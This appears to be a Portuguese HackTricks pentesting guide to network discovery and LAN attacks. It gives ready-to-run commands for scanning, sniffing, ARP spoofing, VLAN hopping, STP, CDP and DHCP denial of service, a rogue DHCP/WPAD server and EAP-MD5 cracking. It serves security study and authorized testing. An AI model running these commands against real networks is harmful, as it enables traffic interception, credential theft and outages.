# Pentesting de Rede

{{#include ../../banners/hacktricks-training.md}}



## Descobrindo hosts a partir do exterior

Esta é uma **seção breve** sobre como encontrar **IPs que respondem** a partir da **Internet**.\
Nessa situação você tem algum **escopo de IPs** (talvez até vários **ranges**) e você só precisa descobrir **quais IPs estão respondendo**.

### ICMP

Esta é a **forma mais fácil** e **mais rápida** de descobrir se um host está ativo ou não.\
Você pode tentar enviar alguns **ICMP** pacotes e esperar respostas. A maneira mais simples é enviar um **echo request** e aguardar a resposta. Você pode fazer isso usando um simples `ping` ou usando `fping` para **ranges**.\
Você também pode usar nmap para enviar outros tipos de ICMP packets (isso evitará filtros ao comum ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descoberta de Portas TCP

É muito comum encontrar que todo tipo de pacotes ICMP está sendo filtrado. Então, tudo o que você pode fazer para verificar se um host está ativo é **try to find open ports**. Cada host tem **65535 ports**, então, se você tiver um escopo "grande" você **não pode** testar se **each port** de cada host está open or not, isso levaria muito tempo.\
Então, o que você precisa é de um **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) e uma lista das **ports mais usadas:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Você também pode realizar esta etapa com `nmap`, mas ele é mais lento e, de certa forma, o `nmap` tem problemas para identificar hosts ativos.

### HTTP Port Discovery

Isso é apenas uma descoberta de portas TCP útil quando você quer **focar na descoberta de serviços HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Você também pode tentar verificar se existe alguma **UDP port open** para decidir se deve **prestar mais atenção** a um **host.** Como serviços UDP normalmente **não respondem** com **nenhum dado** a um pacote probe UDP vazio regular, é difícil dizer se uma port está sendo filtrada ou open. A maneira mais fácil de decidir isso é enviar um packet relacionado ao service em execução, e, como você não sabe qual service está em execução, você deve tentar o mais provável com base no número da port:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
A linha do nmap proposta antes testará as **top 1000 portas UDP** em cada host dentro da faixa **/24**, mas mesmo isso levará **>20min**. Se precisar de **resultados mais rápidos** você pode usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Isso enviará essas **UDP probes** para suas **portas esperadas** (para uma faixa /24 isso levará apenas 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descoberta de portas SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqui você pode encontrar um bom guia de todos os ataques Wifi bem conhecidos na época da escrita:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Descobrindo hosts de dentro da rede

Se você estiver dentro da rede, uma das primeiras coisas que você vai querer fazer é **descobrir outros hosts**. Dependendo de **quanto ruído** você pode/quer fazer, diferentes ações podem ser executadas:

### Passivo

Você pode usar essas ferramentas para descobrir passivamente hosts dentro de uma rede conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ativo

Observe que as técnicas comentadas em [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Observe que as técnicas comentadas em _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, pode fazer **mais coisas**:

- Se você **ping** um **subnet broadcast address**, o ping deve chegar a **cada host** e eles podem **responder** para **você**: `ping -b 10.10.5.255`
- Ao **ping**ar o **network broadcast address** você pode até encontrar hosts em **outras subnets**: `ping -b 255.255.255.255`
- Use as flags `-PE`, `-PP`, `-PM` do `nmap` para realizar descoberta de hosts, enviando respectivamente **ICMPv4 echo**, **timestamp** e **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan é usado para **turn on** computadores através de uma **network message**. O magic packet usado para ligar o computador é basicamente um packet onde um **MAC Dst** é fornecido e então ele é **repetido 16 vezes** dentro do mesmo paket.\
Esse tipo de packets costuma ser enviado em um **ethernet 0x0842** ou em um **UDP packet to port 9**.\
Se **no \[MAC]** for fornecido, o packet é enviado para **broadcast ethernet** (e o broadcast MAC será o que está sendo repetido).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneamento de Hosts

Uma vez que você tenha descoberto todos os IPs (externos ou internos) que deseja escanear em profundidade, diferentes ações podem ser realizadas.

### TCP

- **Porta aberta**: _SYN --> SYN/ACK --> RST_
- **Porta fechada**: _SYN --> RST/ACK_
- **Porta filtrada**: _SYN --> \[NO RESPONSE]_
- **Porta filtrada**: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Existem 2 opções para escanear uma porta UDP:

- Enviar um **UDP packet** e verificar a resposta _**ICMP unreachable**_ se a porta estiver **closed** (em vários casos o ICMP será **filtered**, então você não receberá informação sobre se a porta está **closed** ou **open**).
- Enviar **formatted datagrams** para provocar uma resposta de um **service** (por exemplo, DNS, DHCP, TFTP e outros, como listado em _nmap-payloads_). Se você receber uma **response**, então a porta está **open**.

**Nmap** irá **combinar ambas** as opções usando "-sV" (UDP scans são muito lentos), mas repare que UDP scans são mais lentos que TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** é projetado para ser usado juntamente com **TCP (Transmission Control Protocol)** e **UDP (User Datagram Protocol)**. Seu principal objetivo é facilitar o transporte de dados de telefonia sobre redes IP, espelhando muitas das funcionalidades de confiabilidade encontradas em **Signaling System 7 (SS7)**. **SCTP** é um componente central da família de protocolos **SIGTRAN**, que tem como objetivo transportar sinais SS7 sobre redes IP.

O suporte para **SCTP** é fornecido por vários sistemas operacionais, como **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, e **VxWorks**, indicando sua ampla aceitação e utilidade no campo de telecomunicações e redes.

Dois scans diferentes para SCTP são oferecidos pelo nmap: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Mais opções do nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Revelando endereços IP internos

**Roteadores, firewalls e dispositivos de rede mal configurados** às vezes respondem a sondagens de rede usando **endereços de origem não públicos**. **tcpdump** pode ser utilizado para identificar pacotes recebidos de endereços privados durante os testes. Especificamente, no Kali Linux, pacotes podem ser capturados na interface **eth2**, que é acessível a partir da Internet pública. É importante notar que, se sua configuração estiver atrás de um NAT ou de um Firewall, tais pacotes provavelmente serão filtrados.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Com Sniffing você pode aprender detalhes de IP ranges, tamanhos de sub-rede, MAC addresses e hostnames ao revisar frames e packets capturados. Se a rede estiver mal configurada ou o switching fabric sob estresse, atacantes podem capturar material sensível via passive network sniffing.

Se uma rede Ethernet comutada estiver configurada corretamente, você verá apenas broadcast frames e material destinado ao seu MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Também é possível capturar pacotes de uma máquina remota através de uma sessão SSH usando o Wireshark como GUI em tempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciais

Você pode usar ferramentas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analisar credenciais de um pcap ou de uma interface ao vivo.

## Ataques na LAN

### ARP spoofing

ARP Spoofing consiste em enviar gratuitous ARPResponses para indicar que o IP de uma máquina possui o MAC do nosso dispositivo. Depois, a vítima alterará a tabela ARP e passará a contactar a nossa máquina sempre que tentar alcançar o IP spoofed.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Transborde a tabela CAM do switch enviando muitos pacotes com diferentes endereços MAC de origem. Quando a tabela CAM estiver cheia, o switch passa a se comportar como um hub (broadcasting todo o tráfego).
```bash
macof -i <interface>
```
Em switches modernos essa vulnerabilidade foi corrigida.

### 802.1Q VLAN / DTP Ataques

#### Dynamic Trunking

O **Dynamic Trunking Protocol (DTP)** é projetado como um protocolo de camada de enlace para facilitar um sistema automático de trunking, permitindo que switches selecionem automaticamente portas para modo Trunk ou modo não-Trunk. O uso de **DTP** costuma ser visto como indicativo de um design de rede subótimo, enfatizando a importância de configurar trunks manualmente apenas quando necessário e de manter documentação adequada.

Por padrão, as portas do switch estão configuradas para operar em Dynamic Auto mode, o que significa que estão prontas para iniciar trunking se estimuladas por um switch vizinho. Surge uma preocupação de segurança quando um pentester ou atacante se conecta ao switch e envia um quadro DTP Desirable, forçando a porta a entrar em modo Trunk. Essa ação permite ao atacante enumerar VLANs por meio da análise de quadros STP e contornar a segmentação de VLANs configurando interfaces virtuais.

A presença de DTP em muitos switches por padrão pode ser explorada por adversários para imitar o comportamento de um switch, ganhando acesso ao tráfego de todas as VLANs. O script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) é usado para monitorar uma interface, revelando se um switch está nos modos Default, Trunk, Dynamic, Auto ou Access — sendo Access a única configuração imune a ataques de VLAN hopping. Essa ferramenta avalia o estado de vulnerabilidade do switch.

Se for identificada uma vulnerabilidade na rede, a ferramenta _**Yersinia**_ pode ser empregada para “enable trunking” via o protocolo DTP, permitindo a observação de pacotes de todas as VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Para enumerar as VLANs também é possível gerar o frame DTP Desirable com o script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. **N**ão interrompa o script sob nenhuma circunstância. Ele injeta DTP Desirable a cada três segundos. **Os canais trunk criados dinamicamente no switch duram apenas cinco minutos. Após cinco minutos, o trunk cai.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Gostaria de apontar que **Access/Desirable (0x03)** indica que o frame DTP é do tipo Desirable, o que instrui a porta a mudar para Trunk mode. E **802.1Q/802.1Q (0xa5** indica o tipo de encapsulamento **802.1Q**.

Ao analisar os frames STP, **aprendemos sobre a existência da VLAN 30 e VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Uma vez que você conhece os IDs de VLAN e os valores de IP, você pode **configurar uma interface virtual para atacar uma VLAN específica**.\
Se o DHCP não estiver disponível, então use _ifconfig_ para definir um endereço IP estático.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Os ataques discutidos de **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** em outras VLANs são **executados automaticamente** pela ferramenta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Se um atacante souber o valor do **MAC, IP and VLAN ID of the victim host**, ele pode tentar **double tag a frame** com sua VLAN designada e a VLAN da vítima e enviar um pacote. Como a **vítima não conseguirá conectar de volta** com o atacante, a **melhor opção para o atacante é comunicar via UDP** para protocolos que possam realizar ações interessantes (como SNMP).

Outra opção para o atacante é realizar um **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (provavelmente através da Internet). Então, o atacante poderia sniff no segundo host de sua propriedade se este receber alguns pacotes da vítima.

![](<../../images/image (190).png>)

Para realizar este ataque você pode usar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentação VLAN Lateral <a href="#d679" id="d679"></a>

Se você tem **acesso a um switch ao qual está diretamente conectado**, você tem a capacidade de **bypass da segmentação VLAN** dentro da rede. Simplesmente **mude a porta para trunk mode** (também conhecido como trunk), crie interfaces virtuais com os IDs das VLANs alvo e configure um endereço IP. Você pode tentar solicitar o endereço dinamicamente (DHCP) ou configurá-lo estaticamente. Depende do caso.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Bypass de Private VLAN na Camada 3

Em certos ambientes, como redes wireless para convidados, configurações de **port isolation (também conhecidas como private VLAN)** são implementadas para impedir que clientes conectados a um wireless access point comuniquem-se diretamente entre si. No entanto, foi identificada uma técnica que pode contornar essas medidas de isolamento. Essa técnica explora a ausência de ACLs de rede ou sua configuração incorreta, permitindo que pacotes IP sejam roteados através de um roteador para alcançar outro cliente na mesma rede.

O ataque é executado criando um **pacote que carrega o endereço IP do cliente de destino mas com o MAC address do roteador**. Isso faz com que o roteador encaminhe o pacote equivocadamente para o cliente alvo. Essa abordagem é semelhante à usada em Double Tagging Attacks, onde a capacidade de controlar um host acessível à vítima é usada para explorar a falha de segurança.

Principais Etapas do Ataque:

1. Criação do Pacote: Um pacote é especialmente forjado para incluir o IP do cliente alvo mas com o MAC address do roteador.
2. Explorando o Comportamento do Roteador: O pacote forjado é enviado ao roteador que, devido à configuração, redireciona o pacote para o cliente alvo, contornando o isolamento provido pelas configurações de private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centraliza o gerenciamento de VLANs. Ele utiliza revision numbers para manter a integridade do banco de dados de VLANs; qualquer modificação incrementa esse número. Switches adotam configurações com revision numbers mais altos, atualizando seus próprios bancos de dados de VLAN.

#### VTP Domain Roles

- VTP Server: Gerencia VLANs—cria, deleta, modifica. Ele broadcast VTP announcements para os membros do domínio.
- VTP Client: Recebe VTP announcements para sincronizar seu banco de dados de VLAN. Essa função é restrita e não permite modificações locais na configuração de VLAN.
- VTP Transparent: Não participa de VTP updates mas encaminha VTP announcements. Não é afetado por VTP attacks e mantém um revision number constante de zero.

#### VTP Advertisement Types

- Summary Advertisement: Broadcast pelo VTP server a cada 300 segundos, contendo informações essenciais do domínio.
- Subset Advertisement: Enviado após alterações na configuração de VLAN.
- Advertisement Request: Emitido por um VTP client para solicitar um Summary Advertisement, tipicamente em resposta à detecção de um configuration revision number mais alto.

Vulnerabilidades do VTP são exploráveis exclusivamente via trunk ports, já que VTP announcements circulam somente por eles. Cenários pós-DTP attack podem pivotar para VTP. Ferramentas como Yersinia podem facilitar VTP attacks, visando apagar o VLAN database e, efetivamente, desestabilizar a rede.

Observação: Esta discussão refere-se à versão 1 do VTP (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
No modo gráfico do Yersinia, escolha a opção deleting all VTP vlans para limpar o banco de dados VLAN.

### STP Attacks

**Se você não conseguir capturar quadros BPDU em suas interfaces, é improvável que você consiga ter sucesso em um STP attack.**

#### **STP BPDU DoS**

Ao enviar muitos BPDUs TCP (Topology Change Notification) ou Conf (the BPDUs that are sent when the topology is created), os switches ficam sobrecarregados e deixam de funcionar corretamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Quando um TCP é enviado, a CAM table dos switches será apagada em 15s. Então, se você enviar continuamente esse tipo de pacotes, a CAM table será reiniciada continuamente (ou a cada 15s) e, quando for reiniciada, o switch se comporta como um hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

O atacante simula o comportamento de um switch para se tornar o STP root da rede. Então, mais tráfego passará por ele. Isto é interessante quando você está conectado a dois switches diferentes.\
Isso é feito enviando pacotes BPDUs CONF dizendo que o valor **priority** é menor do que a prioridade atual do root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se o atacante estiver conectado a 2 switches, ele pode ser a raiz da nova árvore e todo o tráfego entre esses switches passará por ele** (um MITM attack será realizado).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) é essencial para a comunicação entre dispositivos CISCO, permitindo que eles **se identifiquem entre si e compartilhem detalhes de configuração**.

#### Coleta de Dados Passiva <a href="#id-0e0f" id="id-0e0f"></a>

O CDP está configurado para transmitir informações por todas as portas, o que pode representar um risco de segurança. Um atacante, ao conectar-se a uma porta do switch, pode empregar sniffers de rede como **Wireshark**, **tcpdump**, ou **Yersinia**. Essa ação pode revelar dados sensíveis sobre o dispositivo de rede, incluindo seu modelo e a versão do Cisco IOS que ele executa. O atacante pode então mirar em vulnerabilidades específicas na versão do Cisco IOS identificada.

#### Induzindo CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Uma abordagem mais agressiva envolve lançar um Denial of Service (DoS) ao sobrecarregar a memória do switch, fingindo ser dispositivos CISCO legítimos. Abaixo está a sequência de comandos para iniciar tal ataque usando Yersinia, uma ferramenta de rede projetada para testes:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante este ataque, a CPU do switch e a CDP neighbor table ficam fortemente sobrecarregadas, levando ao que muitas vezes é referido como **“paralisia de rede”** devido ao consumo excessivo de recursos.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Você também pode usar [**scapy**](https://github.com/secdev/scapy/). Certifique-se de instalá-lo com o pacote `scapy/contrib`.

### Ataques VoIP e a ferramenta VoIP Hopper

Telefones VoIP, cada vez mais integrados com dispositivos IoT, oferecem funcionalidades como destrancar portas ou controlar termostatos por números de telefone especiais. No entanto, essa integração pode representar riscos de segurança.

A ferramenta [**voiphopper**](http://voiphopper.sourceforge.net) foi projetada para emular um telefone VoIP em vários ambientes (Cisco, Avaya, Nortel, Alcatel-Lucent). Ela descobre o VLAN ID da rede de voz usando protocolos como CDP, DHCP, LLDP-MED e 802.1Q ARP.

**VoIP Hopper** oferece três modos para o Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analisa pacotes de rede para identificar o VLAN ID.
2. **Spoof Mode** (`-c 1`): Gera pacotes personalizados imitando os de um dispositivo VoIP real.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Envia pacotes idênticos aos de um modelo específico de telefone IP Cisco.

O modo preferido para velocidade é o terceiro. Ele requer especificar:

- A interface de rede do atacante (`-i` parameter).
- O nome do dispositivo VoIP a ser emulado (`-E` parameter), seguindo o formato de nomenclatura da Cisco (por exemplo, SEP seguido do endereço MAC).

Em ambientes corporativos, para mimetizar um dispositivo VoIP existente, pode-se:

- Inspecionar a etiqueta MAC no telefone.
- Navegar nas configurações de display do telefone para ver informações do modelo.
- Conectar o dispositivo VoIP a um laptop e observar as requisições CDP usando Wireshark.

Um comando de exemplo para executar a ferramenta no terceiro modo seria:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataques DHCP

#### Enumeração
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dois tipos de DoS** podem ser realizados contra servidores DHCP. O primeiro consiste em **simular hosts falsos suficientes para usar todos os possíveis endereços IP**.\
Esse ataque funcionará apenas se você puder ver as respostas do servidor DHCP e completar o protocolo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Por exemplo, isso **não é possível em redes Wifi**.

Outra forma de realizar um DHCP DoS é enviar um **pacote DHCP-RELEASE usando como endereço de origem cada IP possível**. Então, o servidor pensará que todos terminaram de usar o IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Uma forma mais automática de fazer isso é usar a ferramenta [DHCPing](https://github.com/kamorin/DHCPig)

Você pode usar os ataques DoS mencionados para forçar clientes a obter novos leases dentro do ambiente e esgotar servidores legítimos para que se tornem não responsivos. Assim, quando os legítimos tentarem reconectar, você pode fornecer os valores maliciosos mencionados no próximo ataque.

#### Definir valores maliciosos

Um servidor DHCP malicioso pode ser configurado usando o script DHCP localizado em `/usr/share/responder/DHCP.py`. Isso é útil para ataques de rede, como capturar tráfego HTTP e credenciais, redirecionando o tráfego para um servidor malicioso. No entanto, configurar um gateway malicioso é menos eficaz, pois só permite capturar o tráfego de saída do cliente, perdendo as respostas do gateway real. Em vez disso, recomenda-se configurar um servidor DNS ou WPAD malicioso para um ataque mais eficaz.

Abaixo estão as opções de comando para configurar o servidor DHCP malicioso:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` para anunciar o IP da sua máquina como o gateway.
- **Local DNS Domain Name**: Opcionalmente, use `-d example.org` para definir um nome de domínio DNS local.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` para especificar o endereço IP do roteador ou gateway legítimo.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` para definir o endereço IP do servidor DNS malicioso que você controla.
- **Secondary DNS Server IP**: Opcionalmente, use `-s 10.0.0.1` para definir um IP de servidor DNS secundário.
- **Netmask of Local Network**: Use `-n 255.255.255.0` para definir a máscara de rede da rede local.
- **Interface for DHCP Traffic**: Use `-I eth1` para escutar o tráfego DHCP em uma interface de rede específica.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` para definir o endereço de configuração WPAD, auxiliando na interceptação do tráfego web.
- **Spoof Default Gateway IP**: Inclua `-S` para forjar o endereço IP do gateway padrão.
- **Respond to All DHCP Requests**: Inclua `-R` para fazer o servidor responder a todas as requisições DHCP, mas esteja ciente de que isso é barulhento e pode ser detectado.

Ao usar essas opções corretamente, um servidor DHCP malicioso pode ser estabelecido para interceptar o tráfego de rede de forma eficaz.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataques EAP**

Aqui estão algumas das táticas de ataque que podem ser usadas contra implementações 802.1X:

- Brute-force ativo contra senhas via EAP
- Atacando o servidor RADIUS com conteúdo EAP malformado _\*\*_(exploits)
- Captura de mensagens EAP e quebra offline de senhas (EAP-MD5 e PEAP)
- Forçar autenticação EAP-MD5 para contornar a validação de certificados TLS
- Injetar tráfego de rede malicioso ao autenticar usando um hub ou similar

Se o atacante estiver entre a vítima e o servidor de autenticação, ele poderia tentar degradar (se necessário) o protocolo de autenticação para EAP-MD5 e capturar a tentativa de autenticação. Então, ele poderia brute-force isso usando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Ataques <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) é uma classe de protocolos de rede projetada para **criar um sistema de roteamento redundante ativo**. Com FHRP, roteadores físicos podem ser combinados em um único dispositivo lógico, o que aumenta a tolerância a falhas e ajuda a distribuir a carga.

**Engenheiros da Cisco Systems desenvolveram dois protocolos FHRP, GLBP e HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Existem três versões do Routing Information Protocol (RIP): RIP, RIPv2 e RIPng. RIP e RIPv2 enviam datagramas para peers via UDP na porta 520, enquanto o RIPng transmite datagramas por broadcast para a porta UDP 521 via multicast IPv6. O suporte para autenticação MD5 foi introduzido pelo RIPv2. Por outro lado, o RIPng não incorpora autenticação nativa; em vez disso, depende dos cabeçalhos opcionais IPsec AH e ESP no IPv6.

- **RIP and RIPv2:** Comunicação é feita através de datagramas UDP na porta 520.
- **RIPng:** Utiliza a porta UDP 521 para broadcast de datagramas via multicast IPv6.

Note que o RIPv2 suporta autenticação MD5 enquanto o RIPng não inclui autenticação nativa, apoiando-se nos cabeçalhos IPsec AH e ESP no IPv6.

### EIGRP Ataques

